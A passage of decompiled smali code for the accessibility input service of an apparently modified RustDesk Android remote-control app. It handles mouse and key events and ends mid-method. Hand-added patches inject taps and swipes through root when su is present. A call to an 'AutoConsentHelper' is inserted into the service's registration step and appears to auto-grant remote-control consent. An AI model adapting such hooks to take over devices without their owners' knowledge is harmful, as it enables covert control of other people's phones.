.class public final Lcom/carriez/flutter_hbb/InputService;
.super Landroid/accessibilityservice/AccessibilityService;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/carriez/flutter_hbb/InputService$a;
    }
.end annotation


# static fields
.field public static final y:Lcom/carriez/flutter_hbb/InputService$a;

.field public static z:Lcom/carriez/flutter_hbb/InputService;


# instance fields
.field public final h:Ljava/lang/String;

.field public i:Z

.field public j:Landroid/graphics/Path;

.field public k:Landroid/accessibilityservice/GestureDescription$StrokeDescription;

.field public l:J

.field public m:I

.field public n:I

.field public o:Ljava/util/Timer;

.field public p:Ljava/util/TimerTask;

.field public final q:J

.field public final r:Ljava/util/LinkedList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/LinkedList<",
            "Landroid/accessibilityservice/GestureDescription;",
            ">;"
        }
    .end annotation
.end field

.field public s:Z

.field public t:Z

.field public u:Landroid/widget/EditText;

.field public v:I

.field public w:I

.field public final x:Lkotlin/Lazy;


# direct methods
.method public static constructor <clinit>()V
    .registers 2

    new-instance v0, Lcom/carriez/flutter_hbb/InputService$a;

    const/4 v1, 0x0

    invoke-direct {v0, v1}, Lcom/carriez/flutter_hbb/InputService$a;-><init>(Lkotlin/jvm/internal/DefaultConstructorMarker;)V

    sput-object v0, Lcom/carriez/flutter_hbb/InputService;->y:Lcom/carriez/flutter_hbb/InputService$a;

    return-void
.end method

.method public constructor <init>()V
    .registers 5

    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    const-string v0, "input service"

    iput-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v0, Landroid/graphics/Path;

    invoke-direct {v0}, Landroid/graphics/Path;-><init>()V

    iput-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    iput-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->o:Ljava/util/Timer;

    invoke-static {}, Landroid/view/ViewConfiguration;->getTapTimeout()I

    move-result v0

    int-to-long v0, v0

    invoke-static {}, Landroid/view/ViewConfiguration;->getLongPressTimeout()I

    move-result v2

    int-to-long v2, v2

    add-long/2addr v0, v2

    iput-wide v0, p0, Lcom/carriez/flutter_hbb/InputService;->q:J

    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    iput-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->r:Ljava/util/LinkedList;

    new-instance v0, Le4/m;

    invoke-direct {v0, p0}, Le4/m;-><init>(Lcom/carriez/flutter_hbb/InputService;)V

    invoke-static {v0}, Lz6/d;->a(Lm7/a;)Lkotlin/Lazy;

    move-result-object v0

    iput-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->x:Lkotlin/Lazy;

    return-void
.end method

.method public static final K(Lcom/carriez/flutter_hbb/InputService;)Le4/d0;
    .registers 3

    new-instance v0, Le4/d0;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p0

    const-string v1, "audio"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    const-string v1, "null cannot be cast to non-null type android.media.AudioManager"

    invoke-static {p0, v1}, Ln7/j;->c(Ljava/lang/Object;Ljava/lang/String;)V

    check-cast p0, Landroid/media/AudioManager;

    invoke-direct {v0, p0}, Le4/d0;-><init>(Landroid/media/AudioManager;)V

    return-object v0
.end method

.method public static synthetic a(Ljava/lang/String;)V
    .registers 1

    invoke-static {p0}, Lcom/carriez/flutter_hbb/InputService;->x(Ljava/lang/String;)V

    return-void
.end method

.method public static synthetic b(Ln7/q;Lcom/carriez/flutter_hbb/InputService;Ln7/q;Lz5/f;)V
    .registers 4

    invoke-static {p0, p1, p2, p3}, Lcom/carriez/flutter_hbb/InputService;->z(Ln7/q;Lcom/carriez/flutter_hbb/InputService;Ln7/q;Lz5/f;)V

    return-void
.end method

.method public static synthetic c(Lcom/carriez/flutter_hbb/InputService;)Le4/d0;
    .registers 1

    invoke-static {p0}, Lcom/carriez/flutter_hbb/InputService;->K(Lcom/carriez/flutter_hbb/InputService;)Le4/d0;

    move-result-object p0

    return-object p0
.end method

.method public static final synthetic d(Lcom/carriez/flutter_hbb/InputService;)V
    .registers 1

    invoke-virtual {p0}, Lcom/carriez/flutter_hbb/InputService;->n()V

    return-void
.end method

.method public static final synthetic e(Lcom/carriez/flutter_hbb/InputService;II)V
    .registers 3

    invoke-virtual {p0, p1, p2}, Lcom/carriez/flutter_hbb/InputService;->o(II)V

    return-void
.end method

.method public static final synthetic f()Lcom/carriez/flutter_hbb/InputService;
    .registers 1

    sget-object v0, Lcom/carriez/flutter_hbb/InputService;->z:Lcom/carriez/flutter_hbb/InputService;

    return-object v0
.end method

.method public static final synthetic g(Lcom/carriez/flutter_hbb/InputService;)I
    .registers 1

    iget p0, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    return p0
.end method

.method public static final synthetic h(Lcom/carriez/flutter_hbb/InputService;)I
    .registers 1

    iget p0, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    return p0
.end method

.method public static final synthetic i(Lcom/carriez/flutter_hbb/InputService;)Z
    .registers 1

    iget-boolean p0, p0, Lcom/carriez/flutter_hbb/InputService;->t:Z

    return p0
.end method

.method public static final synthetic j(Lcom/carriez/flutter_hbb/InputService;)V
    .registers 1

    sput-object p0, Lcom/carriez/flutter_hbb/InputService;->z:Lcom/carriez/flutter_hbb/InputService;
    invoke-static {p0}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->setupServiceInfo(Landroid/accessibilityservice/AccessibilityService;)V

    return-void
.end method

.method public static final synthetic k(Lcom/carriez/flutter_hbb/InputService;Ljava/util/TimerTask;)V
    .registers 2

    iput-object p1, p0, Lcom/carriez/flutter_hbb/InputService;->p:Ljava/util/TimerTask;

    return-void
.end method

.method public static final synthetic l(Lcom/carriez/flutter_hbb/InputService;Z)V
    .registers 2

    iput-boolean p1, p0, Lcom/carriez/flutter_hbb/InputService;->t:Z

    return-void
.end method

.method public static final synthetic m(Lcom/carriez/flutter_hbb/InputService;Z)V
    .registers 2

    iput-boolean p1, p0, Lcom/carriez/flutter_hbb/InputService;->s:Z

    return-void
.end method

.method public static final x(Ljava/lang/String;)V
    .registers 6

    sget-object v0, Lcom/carriez/flutter_hbb/MainActivity;->s:Lcom/carriez/flutter_hbb/MainActivity$a;

    invoke-virtual {v0}, Lcom/carriez/flutter_hbb/MainActivity$a;->a()Lp6/k;

    move-result-object v0

    if-eqz v0, :cond_28

    const/4 v1, 0x2

    new-array v1, v1, [Lz6/f;

    const/4 v2, 0x0

    const-string v3, "name"

    const-string v4, "input"

    invoke-static {v3, v4}, Lz6/j;->a(Ljava/lang/Object;Ljava/lang/Object;)Lz6/f;

    move-result-object v3

    aput-object v3, v1, v2

    const/4 v2, 0x1

    const-string v3, "value"

    invoke-static {v3, p0}, Lz6/j;->a(Ljava/lang/Object;Ljava/lang/Object;)Lz6/f;

    move-result-object p0

    aput-object p0, v1, v2

    invoke-static {v1}, La7/b0;->e([Lz6/f;)Ljava/util/Map;

    move-result-object p0

    const-string v1, "on_state_changed"

    invoke-virtual {v0, v1, p0}, Lp6/k;->c(Ljava/lang/String;Ljava/lang/Object;)V

    :cond_28
    return-void
.end method

.method public static final z(Ln7/q;Lcom/carriez/flutter_hbb/InputService;Ln7/q;Lz5/f;)V
    .registers 8

    iget-object p0, p0, Ln7/q;->h:Ljava/lang/Object;

    check-cast p0, Landroid/view/KeyEvent;

    if-eqz p0, :cond_5b

    invoke-virtual {p1}, Lcom/carriez/flutter_hbb/InputService;->D()Ljava/util/LinkedList;

    move-result-object v0

    iget-object v1, p1, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "possibleNodes:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v0}, Ljava/util/AbstractCollection;->iterator()Ljava/util/Iterator;

    move-result-object v0

    const-string v1, "iterator(...)"

    invoke-static {v0, v1}, Ln7/j;->d(Ljava/lang/Object;Ljava/lang/String;)V

    :cond_29
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_5b

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    const-string v2, "next(...)"

    invoke-static {v1, v2}, Ln7/j;->d(Ljava/lang/Object;Ljava/lang/String;)V

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    iget-object v2, p2, Ln7/q;->h:Ljava/lang/Object;

    check-cast v2, Ljava/lang/String;

    invoke-virtual {p1, p0, v1, v2}, Lcom/carriez/flutter_hbb/InputService;->H(Landroid/view/KeyEvent;Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_29

    invoke-virtual {p3}, Lz5/f;->R()Z

    move-result p3

    if-eqz p3, :cond_5b

    new-instance p3, Landroid/view/KeyEvent;

    const/4 v0, 0x1

    invoke-virtual {p0}, Landroid/view/KeyEvent;->getKeyCode()I

    move-result p0

    invoke-direct {p3, v0, p0}, Landroid/view/KeyEvent;-><init>(II)V

    iget-object p0, p2, Ln7/q;->h:Ljava/lang/Object;

    check-cast p0, Ljava/lang/String;

    invoke-virtual {p1, p3, v1, p0}, Lcom/carriez/flutter_hbb/InputService;->H(Landroid/view/KeyEvent;Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    :cond_5b
    return-void
.end method


# virtual methods
.method public final A(III)V
    .registers 10

    const/4 v0, 0x0

    invoke-static {v0, p2}, Ljava/lang/Math;->max(II)I

    move-result p2

    invoke-static {v0, p3}, Ljava/lang/Math;->max(II)I

    move-result p3

    # If both p2 == 0 and p3 == 0 (button click events in RustDesk), do NOT overwrite m and n!
    if-nez p2, :cond_do_update

    if-nez p3, :cond_do_update

    goto :cond_skip_update

    :cond_do_update
    invoke-static {}, Lcom/carriez/flutter_hbb/a;->c()Le4/j;

    move-result-object v1

    invoke-virtual {v1}, Le4/j;->c()I

    move-result v1

    mul-int p2, p2, v1

    iput p2, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    mul-int p3, p3, v1

    iput p3, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    :cond_skip_update
    # Check mask:
    # 9 = LEFT_DOWN
    const/16 v1, 0x9

    if-ne p1, v1, :cond_check_move

    const/4 v1, 0x1

    iput-boolean v1, p0, Lcom/carriez/flutter_hbb/InputService;->i:Z

    iput-boolean v1, p0, Lcom/carriez/flutter_hbb/InputService;->t:Z

    iget p1, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    iget p2, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    invoke-virtual {p0, p1, p2}, Lcom/carriez/flutter_hbb/InputService;->E(II)V

    return-void

    # 8 = LEFT_MOVE
    :cond_check_move
    const/16 v1, 0x8

    if-ne p1, v1, :cond_check_up

    iget-boolean v1, p0, Lcom/carriez/flutter_hbb/InputService;->i:Z

    if-eqz v1, :cond_ret

    # Check if moved > 16 pixels from start
    iget v1, p0, Lcom/carriez/flutter_hbb/InputService;->v:I

    iget v2, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    sub-int/2addr v1, v2

    invoke-static {v1}, Ljava/lang/Math;->abs(I)I

    move-result v1

    iget v2, p0, Lcom/carriez/flutter_hbb/InputService;->w:I

    iget v3, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    sub-int/2addr v2, v3

    invoke-static {v2}, Ljava/lang/Math;->abs(I)I

    move-result v2

    add-int/2addr v1, v2

    const/16 v2, 0x10

    if-le v1, v2, :cond_ret

    iput-boolean v0, p0, Lcom/carriez/flutter_hbb/InputService;->t:Z

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    iget-wide v3, p0, Lcom/carriez/flutter_hbb/InputService;->l:J

    sub-long/2addr v1, v3

    const-wide/16 v3, 0x50

    cmp-long v5, v1, v3

    if-ltz v5, :cond_ret

    iget p1, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    iget p2, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    invoke-virtual {p0, p1, p2}, Lcom/carriez/flutter_hbb/InputService;->o(II)V

    :cond_ret
    return-void

    # 10 = LEFT_UP
    :cond_check_up
    const/16 v1, 0xa

    if-ne p1, v1, :cond_check_right

    iget-boolean v1, p0, Lcom/carriez/flutter_hbb/InputService;->i:Z

    if-eqz v1, :cond_up_done

    iput-boolean v0, p0, Lcom/carriez/flutter_hbb/InputService;->i:Z

    iget-boolean v1, p0, Lcom/carriez/flutter_hbb/InputService;->t:Z

    if-eqz v1, :cond_up_drag

    # CLICK: delegate directly to C(m, n, 50) without duplicate tap
    iput-boolean v0, p0, Lcom/carriez/flutter_hbb/InputService;->t:Z

    iget p1, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    iget p2, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    const-wide/16 v0, 0x50

    invoke-virtual {p0, p1, p2, v0, v1}, Lcom/carriez/flutter_hbb/InputService;->C(IIJ)V

    return-void

    :cond_up_drag
    # Drag completed: trigger direct root swipe
    iput-boolean v0, p0, Lcom/carriez/flutter_hbb/InputService;->t:Z

    iget p1, p0, Lcom/carriez/flutter_hbb/InputService;->v:I

    iget p2, p0, Lcom/carriez/flutter_hbb/InputService;->w:I

    iget v1, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    iget v2, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    invoke-static {p1, p2, v1, v2}, Lcom/carriez/flutter_hbb/InputService;->injectRootSwipe(IIII)V

    return-void

    :cond_up_done
    return-void

    # 18 = RIGHT_UP
    :cond_check_right
    const/16 p2, 0x12

    if-ne p1, p2, :cond_a1

    iget p1, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    iget p2, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    invoke-virtual {p0, p1, p2}, Lcom/carriez/flutter_hbb/InputService;->v(II)V

    return-void

    # 66 = BACK_UP
    :cond_a1
    const/16 p2, 0x42

    if-ne p1, p2, :cond_a9

    const/4 p1, 0x1

    invoke-virtual {p0, p1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    return-void

    # 33 = WHEEL_BUTTON_DOWN
    :cond_a9
    const/16 p2, 0x21

    if-ne p1, p2, :cond_c0

    iget-object p2, p0, Lcom/carriez/flutter_hbb/InputService;->o:Ljava/util/Timer;

    invoke-virtual {p2}, Ljava/util/Timer;->purge()I

    new-instance p2, Lcom/carriez/flutter_hbb/InputService$d;

    invoke-direct {p2, p0}, Lcom/carriez/flutter_hbb/InputService$d;-><init>(Lcom/carriez/flutter_hbb/InputService;)V

    iput-object p2, p0, Lcom/carriez/flutter_hbb/InputService;->p:Ljava/util/TimerTask;

    iget-object p3, p0, Lcom/carriez/flutter_hbb/InputService;->o:Ljava/util/Timer;

    const-wide/16 v0, 0xc8

    invoke-virtual {p3, p2, v0, v1}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    # 34 = WHEEL_BUTTON_UP
    :cond_c0
    const/16 p2, 0x22

    if-ne p1, p2, :cond_d3

    iget-object p1, p0, Lcom/carriez/flutter_hbb/InputService;->p:Ljava/util/TimerTask;

    if-eqz p1, :cond_d2

    invoke-static {p1}, Ln7/j;->b(Ljava/lang/Object;)V

    invoke-virtual {p1}, Ljava/util/TimerTask;->cancel()Z

    const/4 p1, 0x2

    invoke-virtual {p0, p1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    :cond_d2
    return-void

    # WHEEL_DOWN (0x7fc43)
    :cond_d3
    const p2, 0x7fc43

    if-ne p1, p2, :cond_115

    iget p1, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    iget p2, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    const/16 v0, 0x12c

    sub-int v1, p2, v0

    const/4 v2, 0x0

    invoke-static {v2, v1}, Ljava/lang/Math;->max(II)I

    move-result v1

    invoke-static {p1, p2, p1, v1}, Lcom/carriez/flutter_hbb/InputService;->injectRootSwipe(IIII)V

    return-void

    # WHEEL_UP (0x7fc44)
    :cond_115
    const p2, 0x7fc44

    if-ne p1, p2, :cond_14e

    iget p1, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    iget p2, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    const/16 v0, 0x12c

    add-int v1, p2, v0

    invoke-static {p1, p2, p1, v1}, Lcom/carriez/flutter_hbb/InputService;->injectRootSwipe(IIII)V

    return-void

    # 44 = KEY_PAGE_UP
    :cond_14e
    const p2, 0x7fc41

    if-ne p1, p2, :cond_159

    iget p1, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    invoke-virtual {p0, p1}, Lcom/carriez/flutter_hbb/InputService;->s(I)V

    return-void

    # 45 = KEY_PAGE_DOWN
    :cond_159
    const p2, 0x7fc42

    if-ne p1, p2, :cond_163

    iget p1, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    invoke-virtual {p0, p1}, Lcom/carriez/flutter_hbb/InputService;->r(I)V

    :cond_163
    return-void
.end method

.method public final B(III)V
    .registers 6

    const/4 v0, 0x4

    const/4 v1, 0x0

    if-eq p1, v0, :cond_68

    const/4 v0, 0x5

    if-eq p1, v0, :cond_34

    const/4 v0, 0x6

    if-eq p1, v0, :cond_c

    goto/16 :goto_8d

    :cond_c
    iget p1, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    iget v0, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    invoke-virtual {p0, p1, v0}, Lcom/carriez/flutter_hbb/InputService;->q(II)V

    invoke-static {v1, p2}, Ljava/lang/Math;->max(II)I

    move-result p1

    invoke-static {}, Lcom/carriez/flutter_hbb/a;->c()Le4/j;

    move-result-object p2

    invoke-virtual {p2}, Le4/j;->c()I

    move-result p2

    mul-int p1, p1, p2

    iput p1, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    invoke-static {v1, p3}, Ljava/lang/Math;->max(II)I

    move-result p1

    invoke-static {}, Lcom/carriez/flutter_hbb/a;->c()Le4/j;

    move-result-object p2

    invoke-virtual {p2}, Le4/j;->c()I

    move-result p2

    mul-int p1, p1, p2

    iput p1, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    goto :goto_8d

    :cond_34
    iget p1, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    invoke-static {}, Lcom/carriez/flutter_hbb/a;->c()Le4/j;

    move-result-object v0

    invoke-virtual {v0}, Le4/j;->c()I

    move-result v0

    mul-int p2, p2, v0

    sub-int/2addr p1, p2

    iput p1, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    iget p1, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    invoke-static {}, Lcom/carriez/flutter_hbb/a;->c()Le4/j;

    move-result-object p2

    invoke-virtual {p2}, Le4/j;->c()I

    move-result p2

    mul-int p3, p3, p2

    sub-int/2addr p1, p3

    iput p1, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    iget p1, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    invoke-static {v1, p1}, Ljava/lang/Math;->max(II)I

    move-result p1

    iput p1, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    iget p1, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    invoke-static {v1, p1}, Ljava/lang/Math;->max(II)I

    move-result p1

    iput p1, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    iget p2, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    invoke-virtual {p0, p2, p1}, Lcom/carriez/flutter_hbb/InputService;->o(II)V

    goto :goto_8d

    :cond_68
    invoke-static {v1, p2}, Ljava/lang/Math;->max(II)I

    move-result p1

    invoke-static {}, Lcom/carriez/flutter_hbb/a;->c()Le4/j;

    move-result-object p2

    invoke-virtual {p2}, Le4/j;->c()I

    move-result p2

    mul-int p1, p1, p2

    iput p1, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    invoke-static {v1, p3}, Ljava/lang/Math;->max(II)I

    move-result p1

    invoke-static {}, Lcom/carriez/flutter_hbb/a;->c()Le4/j;

    move-result-object p2

    invoke-virtual {p2}, Le4/j;->c()I

    move-result p2

    mul-int p1, p1, p2

    iput p1, p0, Lcom/carriez/flutter_hbb/InputService;->n:I

    iget p2, p0, Lcom/carriez/flutter_hbb/InputService;->m:I

    invoke-virtual {p0, p2, p1}, Lcom/carriez/flutter_hbb/InputService;->E(II)V

    :goto_8d
    return-void
.end method

.method public final C(IIJ)V
    .registers 12

    # Check if root is available
    new-instance v0, Ljava/io/File;
    const-string v1, "/system/bin/su"
    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0}, Ljava/io/File;->exists()Z
    move-result v0
    if-eqz v0, :cond_acc_fallback

    # Single root tap execution
    invoke-static {p1, p2}, Lcom/carriez/flutter_hbb/InputService;->injectRootTap(II)V
    return-void

    :cond_acc_fallback
    # Accessibility fallback for non-rooted environments
    new-instance v1, Landroid/graphics/Path;
    invoke-direct {v1}, Landroid/graphics/Path;-><init>()V
    int-to-float v0, p1
    int-to-float v2, p2
    invoke-virtual {v1, v0, v2}, Landroid/graphics/Path;->moveTo(FF)V

    :try_start_a
    new-instance v6, Landroid/accessibilityservice/GestureDescription$StrokeDescription;
    const-wide/16 v2, 0x0
    move-object v0, v6
    move-wide v4, p3
    invoke-direct/range {v0 .. v5}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    new-instance v0, Landroid/accessibilityservice/GestureDescription$Builder;
    invoke-direct {v0}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V
    invoke-virtual {v0, v6}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {v0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;
    move-result-object p1
    const/4 p2, 0x0
    invoke-virtual {p0, p1, p2, p2}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z
    :try_end_30
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_30} :catch_31

    goto :goto_done

    :catch_31
    move-exception v0

    :goto_done
    return-void
.end method

.method public final D()Ljava/util/LinkedList;
    .registers 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/LinkedList<",
            "Landroid/view/accessibility/AccessibilityNodeInfo;",
            ">;"
        }
    .end annotation

    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    new-instance v1, Ljava/util/LinkedList;

    invoke-direct {v1}, Ljava/util/LinkedList;-><init>()V

    const/4 v2, 0x1

    invoke-virtual {p0, v2}, Landroid/accessibilityservice/AccessibilityService;->findFocus(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    const/4 v3, 0x2

    invoke-virtual {p0, v3}, Landroid/accessibilityservice/AccessibilityService;->findFocus(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    iget-object v5, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "focusInput:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v7, " focusAccessibilityInput:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v7, " rootInActiveWindow:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    if-eqz v2, :cond_53

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->isFocusable()Z

    move-result v5

    if-eqz v5, :cond_50

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    move-result v5

    if-eqz v5, :cond_50

    invoke-virtual {p0, v0, v2}, Lcom/carriez/flutter_hbb/InputService;->u(Ljava/util/LinkedList;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    goto :goto_53

    :cond_50
    invoke-virtual {p0, v1, v2}, Lcom/carriez/flutter_hbb/InputService;->u(Ljava/util/LinkedList;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_53
    :goto_53
    if-eqz v3, :cond_68

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isFocusable()Z

    move-result v5

    if-eqz v5, :cond_65

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    move-result v5

    if-eqz v5, :cond_65

    invoke-virtual {p0, v0, v3}, Lcom/carriez/flutter_hbb/InputService;->u(Ljava/util/LinkedList;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    goto :goto_68

    :cond_65
    invoke-virtual {p0, v1, v3}, Lcom/carriez/flutter_hbb/InputService;->u(Ljava/util/LinkedList;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_68
    :goto_68
    invoke-virtual {p0, v2}, Lcom/carriez/flutter_hbb/InputService;->s(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    iget-object v5, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "childFromFocusInput:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    if-eqz v2, :cond_87

    invoke-virtual {p0, v0, v2}, Lcom/carriez/flutter_hbb/InputService;->u(Ljava/util/LinkedList;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_87
    invoke-virtual {p0, v3}, Lcom/carriez/flutter_hbb/InputService;->s(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_90

    invoke-virtual {p0, v0, v2}, Lcom/carriez/flutter_hbb/InputService;->u(Ljava/util/LinkedList;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_90
    iget-object v3, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "childFromFocusAccessibilityInput:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    if-eqz v4, :cond_ab

    invoke-virtual {p0, v0, v4}, Lcom/carriez/flutter_hbb/InputService;->u(Ljava/util/LinkedList;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_ab
    invoke-virtual {v1}, Ljava/util/AbstractCollection;->iterator()Ljava/util/Iterator;

    move-result-object v1

    const-string v2, "iterator(...)"

    invoke-static {v1, v2}, Ln7/j;->d(Ljava/lang/Object;Ljava/lang/String;)V

    :goto_b4
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_c9

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

